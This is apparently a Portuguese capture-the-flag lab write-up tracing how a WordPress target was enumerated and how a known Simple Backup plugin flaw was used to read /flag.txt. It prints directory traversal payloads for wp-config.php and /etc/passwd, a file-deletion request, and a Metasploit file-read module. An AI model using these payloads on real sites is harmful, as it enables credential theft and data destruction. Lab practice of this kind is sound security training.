####################################################################################################
# HTB - PUBLIC EXPLOITS
#
# DOCUMENTAÇÃO ESPECÍFICA
# DE ONDE CADA CAMINHO FOI DESCOBERTO
#
# Objetivo:
# Entender exatamente COMO os caminhos foram encontrados
# durante o processo de enumeração.
#
####################################################################################################



####################################################################################################
# CAMINHO 1
####################################################################################################

# DESCOBERTO POR:
# Gobuster

gobuster dir \
-u http://154.57.164.81:31337 \
-w common.txt

# RESULTADO:

/wp-login.php

# RACIOCÍNIO:

# Gobuster força palavras de uma wordlist.
# Encontrou um arquivo padrão do WordPress.

# CONCLUSÃO:

# Se existe wp-login.php
# provavelmente existe WordPress.

####################################################################################################



####################################################################################################
# CAMINHO 2
####################################################################################################

# DESCOBERTO POR:
# Gobuster

# RESULTADO:

/wp-content

# RACIOCÍNIO:

# Diretório padrão onde plugins e uploads ficam armazenados.

# CONCLUSÃO:

# Confirma WordPress.

####################################################################################################



####################################################################################################
# CAMINHO 3
####################################################################################################

# DESCOBERTO POR:
# Gobuster

# RESULTADO:

/wp-includes

# RACIOCÍNIO:

# Diretório interno do WordPress.

# CONCLUSÃO:

# Confirma WordPress.

####################################################################################################



####################################################################################################
# CAMINHO 4
####################################################################################################

# DESCOBERTO POR:
# WPScan

wpscan --url http://154.57.164.81:30437

# RESULTADO:

/xmlrpc.php

# RACIOCÍNIO:

# WPScan conhece dezenas de endpoints padrões
# do WordPress.

# Ele testa automaticamente:

/xmlrpc.php

# CONCLUSÃO:

# XMLRPC habilitado.

####################################################################################################



####################################################################################################
# CAMINHO 5
####################################################################################################

# DESCOBERTO POR:
# WPScan

# RESULTADO:

/readme.html

# RACIOCÍNIO:

# Arquivo padrão do WordPress.

# WPScan testa automaticamente.

# CONCLUSÃO:

# Ajuda a descobrir versão.

####################################################################################################



####################################################################################################
# CAMINHO 6
####################################################################################################

# DESCOBERTO POR:
# WPScan

# RESULTADO:

/wp-content/uploads/

# RACIOCÍNIO:

# Diretório padrão de uploads do WordPress.

# WPScan verifica se existe listagem habilitada.

# CONCLUSÃO:

# Upload Listing Enabled.

####################################################################################################



####################################################################################################
# CAMINHO 7
####################################################################################################

# DESCOBERTO POR:
# Navegação Manual

curl -s \
http://154.57.164.81:30437/wp-content/uploads/

# RESULTADO:

/2026/

# RACIOCÍNIO:

# O Apache mostrou o conteúdo do diretório.

# Então seguimos navegando.

####################################################################################################



####################################################################################################
# CAMINHO 8
####################################################################################################

# DESCOBERTO POR:
# Navegação Manual

curl -s \
http://154.57.164.81:30437/wp-content/uploads/2026/

# RESULTADO:

/06/

# RACIOCÍNIO:

# O próprio Apache listou a pasta.

####################################################################################################



####################################################################################################
# CAMINHO 9
####################################################################################################

# DESCOBERTO POR:
# WPScan

# TRECHO DA SAÍDA:

Confirmed By:
Wp Json Api

http://154.57.164.81:30437/index.php/wp-json/wp/v2/users

# RACIOCÍNIO:

# O WPScan revelou que a REST API
# estava habilitada.

# CONCLUSÃO:

# Encontramos o primeiro endpoint REST.

####################################################################################################



####################################################################################################
# CAMINHO 10
####################################################################################################

# DESCOBERTO POR:
# Conhecimento da REST API do WordPress

# PARTINDO DE:

/wp-json/wp/v2/users

# RACIOCÍNIO:

# Se existe:

/wp-json/wp/v2/users

# normalmente também existem:

/wp-json/wp/v2/posts
/wp-json/wp/v2/comments
/wp-json/wp/v2/pages
/wp-json/wp/v2/media

# TESTE:

curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/posts

# RESULTADO:

Simple Backup Plugin 2.7.10

# ESTE FOI O CAMINHO MAIS IMPORTANTE DO LAB.

####################################################################################################



####################################################################################################
# CAMINHO 11
####################################################################################################

# DESCOBERTO POR:
# Conhecimento da REST API

curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/comments

# RACIOCÍNIO:

# Endpoint padrão do WordPress.

####################################################################################################



####################################################################################################
# CAMINHO 12
####################################################################################################

# DESCOBERTO POR:
# Informação encontrada no POST

# TRECHO ENCONTRADO:

"This plugin will create a directory in the root
of your WordPress directory called simple-backup"

# RACIOCÍNIO:

# O próprio plugin informou:

simple-backup

# TESTE:

curl -s \
http://154.57.164.81:30437/simple-backup/

# RESULTADO:

Index of /simple-backup

# CONCLUSÃO:

# Diretório realmente existia.

####################################################################################################



####################################################################################################
# CAMINHO 13
####################################################################################################

# DESCOBERTO POR:
# ExploitDB

searchsploit -x 39883

# TRECHO DO EXPLOIT:

tools.php?page=backup_manager

# RACIOCÍNIO:

# O pesquisador de segurança já havia
# descoberto qual endpoint vulnerável
# o plugin utilizava.

# CAMINHO:

/wp-admin/tools.php?page=backup_manager

####################################################################################################



####################################################################################################
# CAMINHO 14
####################################################################################################

# DESCOBERTO POR:
# ExploitDB

# TRECHO:

download_backup_file=

# RACIOCÍNIO:

# Parâmetro usado para baixar arquivos.

# TESTE:

curl \
"http://IP/wp-admin/tools.php?page=backup_manager&download_backup_file=.htaccess"

# RESULTADO:

Arquivo baixado.

####################################################################################################



####################################################################################################
# CAMINHO 15
####################################################################################################

# DESCOBERTO POR:
# ExploitDB

# TRECHO:

delete_backup_file=

# RACIOCÍNIO:

# Parâmetro usado para apagar arquivos.

# TESTE:

curl \
"http://IP/wp-admin/tools.php?page=backup_manager&delete_backup_file=.htaccess"

# RESULTADO:

Arquivo removido.

####################################################################################################



####################################################################################################
# CAMINHO 16
####################################################################################################

# DESCOBERTO POR:
# ExploitDB

# TRECHO ORIGINAL:

oldBackups/../../wp-config.php

# RACIOCÍNIO:

# O autor do exploit demonstrou
# um ataque de Directory Traversal.

# NÓS APENAS REPRODUZIMOS.

####################################################################################################



####################################################################################################
# CAMINHO 17
####################################################################################################

# DESCOBERTO POR:
# ExploitDB

# TRECHO ORIGINAL:

oldBackups/../../../../../../etc/passwd

# RACIOCÍNIO:

# Outro exemplo fornecido pelo autor.

####################################################################################################



####################################################################################################
# CAMINHO FINAL QUE LEVOU À FLAG
####################################################################################################

# DESCOBERTO POR:

Metasploit

search simple backup

# RESULTADO:

auxiliary/scanner/http/wp_simple_backup_file_read

# CONFIGURAÇÃO:

set FILEPATH /flag.txt

# RACIOCÍNIO:

# A própria questão do laboratório dizia:

"Get the content of /flag.txt"

# Portanto:

/flag.txt

# NÃO FOI DESCOBERTO.
# FOI INFORMADO PELA QUESTÃO.

####################################################################################################



####################################################################################################
# RESUMO
####################################################################################################

# Gobuster descobriu:

/wp-login.php
/wp-content
/wp-includes

# WPScan descobriu:

/xmlrpc.php
/readme.html
/wp-content/uploads/
/wp-json/wp/v2/users

# Conhecimento WordPress revelou:

/wp-json/wp/v2/posts
/wp-json/wp/v2/comments

# O endpoint POSTS revelou:

Simple Backup Plugin 2.7.10

# O POST revelou:

/simple-backup/

# ExploitDB revelou:

/wp-admin/tools.php?page=backup_manager
download_backup_file=
delete_backup_file=
oldBackups/../../wp-config.php
oldBackups/../../../../../../etc/passwd

# Metasploit revelou:

auxiliary/scanner/http/wp_simple_backup_file_read

# A questão revelou:

/flag.txt

####################################################################################################
# DESCOBERTA MAIS IMPORTANTE DE TODO O LAB
####################################################################################################

curl -s \
http://154.57.164.81:30437/index.php/wp-json/wp/v2/posts

# Porque foi esse endpoint que revelou:

"Simple Backup Plugin 2.7.10"

# E sem essa informação provavelmente não
# encontraríamos o exploit correto.
####################################################################################################